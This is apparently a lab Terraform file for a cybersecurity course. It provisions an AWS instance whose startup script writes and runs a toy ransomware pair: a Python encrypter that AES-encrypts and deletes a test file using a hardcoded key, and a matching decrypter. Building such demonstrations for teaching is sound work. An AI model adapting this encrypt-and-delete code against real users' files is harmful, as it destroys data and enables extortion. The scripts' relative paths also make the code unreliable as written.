provider "aws" {
  region = "us-east-1"  # Defina a região desejada
}

resource "aws_instance" "kali_vm" {
  ami           = "ami-0c55b159cbfafe1f0"  # Substitua pelo AMI do Kali Linux
  instance_type = "t2.medium"  # Kali Linux pode exigir mais recursos

  user_data = <<-EOF
              #!/bin/bash
              # Atualizar e instalar Python e pip
              apt-get update
              apt-get install -y python3 python3-pip

              # Instalar a biblioteca pyaes
              pip3 install pyaes

              # Criar o arquivo teste.txt
              echo "cybersecurity dio" > /home/ubuntu/teste.txt

              # Criar o script encrypter.py
              cat > /home/ubuntu/encrypter.py <<EOL
              import os
              import pyaes

              ## abrir o arquivo a ser criptografado
              file_name = "teste.txt"
              file = open(file_name, "rb")
              file_data = file.read()
              file.close()

              ## remover o arquivo
              os.remove(file_name)

              ## chave de criptografia
              key = b"testeransomwares"
              aes = pyaes.AESModeOfOperationCTR(key)

              ## criptografar o arquivo
              crypto_data = aes.encrypt(file_data)

              ## salvar o arquivo criptografado
              new_file = file_name + ".ransomwaretroll"
              new_file = open(f'{new_file}','wb')
              new_file.write(crypto_data)
              new_file.close()
              EOL

              # Criar o script decrypter.py
              cat > /home/ubuntu/decrypter.py <<EOL
              import os
              import pyaes

              ## abrir o arquivo criptografado
              file_name = "teste.txt.ransomwaretroll"
              file = open(file_name, "rb")
              file_data = file.read()
              file.close()

              ## chave para descriptografia
              key = b"testeransomwares"
              aes = pyaes.AESModeOfOperationCTR(key)
              decrypt_data = aes.decrypt(file_data)

              ## remover o arquivo criptografado
              os.remove(file_name)

              ## criar o arquivo descriptografado
              new_file = "teste.txt"
              new_file = open(f'{new_file}', "wb")
              new_file.write(decrypt_data)
              new_file.close()
              EOL

              # Executar o encrypter.py
              python3 /home/ubuntu/encrypter.py

              # Executar o decrypter.py
              python3 /home/ubuntu/decrypter.py

              # Verificar o conteúdo do arquivo descriptografado
              echo "Conteúdo do arquivo descriptografado:"
              cat /home/ubuntu/teste.txt
              EOF

  tags = {
    Name = "kali-linux-vm"
  }
}

output "public_ip" {
  value = aws_instance.kali_vm.public_ip
}
